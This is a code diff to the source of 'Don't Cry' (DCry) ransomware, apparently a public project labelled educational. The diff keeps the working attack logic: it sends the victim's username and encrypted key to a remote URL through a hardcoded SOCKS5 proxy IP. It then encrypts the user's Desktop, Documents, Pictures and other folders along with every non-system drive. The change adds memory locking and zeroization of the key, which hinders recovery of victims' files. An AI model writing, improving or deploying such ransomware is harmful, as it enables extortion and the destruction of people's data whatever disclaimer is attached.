@@ -2,9 +2,12 @@
 #                             Don't Cry Ransomware                             #
 #                          ! EDUCATIONAL PURPOSES ONLY !                       #
 ################################################################################
-# Warning: This is DCry malware, developed to perform an actual attack on a server system.
-# Therefore, this malware can cause serious damage to your system and data.
-# Use this code with caution and only in advanced simulated cyberattack scenarios under the supervision of at least one cybersecurity expert.
+# DISCLAIMER: This is a simulated ransomware (DCry), written for cybersecurity
+# research, ethical hacking education, and malware analysis training only.
+# It mimics behavior of real ransomware but must NOT be used for illegal or 
+# unauthorized activity. Run only in isolated environments (e.g., sandbox or VM) 
+# under supervision of cybersecurity professionals.
+# The authors assume no liability for any misuse or damage caused.
 
 import os
 import sys
@@ -20,6 +23,7 @@ import subprocess
 from datetime import datetime
 from Crypto.Random import get_random_bytes
 from concurrent.futures import ThreadPoolExecutor
+from zeroize import zeroize1, mlock, munlock
 
 import requests
 import winshell
@@ -318,47 +322,51 @@ def encrypt_key(aes_key):
 def start_encryption():
     global id
     id = uuid.uuid1()
-    key = get_random_bytes(16)
-    key_b64 = base64.urlsafe_b64encode(b"DCRY+DKEY$" + key).decode()
-    encrypted_key = encrypt_key(key_b64.encode())
-    
-    data = {
-        'username': os.getlogin(),
-        'id': str(id),
-        'date': datetime.now().strftime('%d-%m-%Y'),
-        'key': base64.b64encode(encrypted_key).decode()
-    }
-    
-    proxies = {
-        'http': 'socks5h://146.190.245.171:1080',
-        'https': 'socks5h://146.190.245.171:1080'
-    } # replace with your proxy if you have one
-
+    key = bytearray(get_random_bytes(16))
     try:
-        requests.post(YOUR_URL, data=data, proxies=proxies, verify=False, timeout=30)
-    except requests.exceptions.RequestException as e:
-        print(f"Error sending data: {e}")
+        mlock(key)
+        
+        key_b64 = base64.urlsafe_b64encode(b"DCRY+DKEY$" + bytes(key)).decode()
+        encrypted_key = encrypt_key(key_b64.encode())
+        
+        data = {
+            'username': os.getlogin(),
+            'id': str(id),
+            'date': datetime.now().strftime('%d-%m-%Y'), 
+            'key': base64.b64encode(encrypted_key).decode()
+        }
+        
+        proxies = {
+            'http': 'socks5h://146.190.245.171:1080',
+            'https': 'socks5h://146.190.245.171:1080'
+        } # Replace with your proxy if needed
 
-    with open(os.path.join(f"C:\\Users\\{getpass.getuser()}", "key.sha256"), "wb") as f:
-        f.write(hashlib.sha256(key).hexdigest().encode())
-    encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Desktop"), key)
-    encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Downloads"), key)
-    encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Documents"), key)
-    encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Pictures"), key)
-    encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Videos"), key)
-    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
-    for disk in [
-        f"{letter}:/"
-        for i, letter in enumerate(string.ascii_uppercase)
-        if bitmask & (1 << i)
-    ]:
-        if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv("HOMEDRIVE"):
-            encrypt_directory(disk, key)
-    # wipes the key out of memory
-    # IDK but hope it works
-    for _ in range(300):
-        pass
-    del key, key_b64, encrypted_key
+        try:
+            requests.post(YOUR_URL, data=data, proxies=proxies, verify=False, timeout=30)
+        except requests.exceptions.RequestException as e:
+            print(f"Error sending data: {e}")
+
+        with open(os.path.join(f"C:\\Users\\{getpass.getuser()}", "key.sha256"), "wb") as f:
+            f.write(hashlib.sha256(bytes(key)).hexdigest().encode())
+            
+        encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Desktop"), key)
+        encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Downloads"), key)
+        encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Documents"), key)
+        encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Pictures"), key)
+        encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Videos"), key)
+        
+        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
+        for disk in [
+            f"{letter}:/"
+            for i, letter in enumerate(string.ascii_uppercase)
+            if bitmask & (1 << i)
+        ]:
+            if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv("HOMEDRIVE"):
+                encrypt_directory(disk, key)
+                
+    finally:
+        zeroize1(key)
+        munlock(key)
 
 
 def encrypt_directory(directory_path, key):
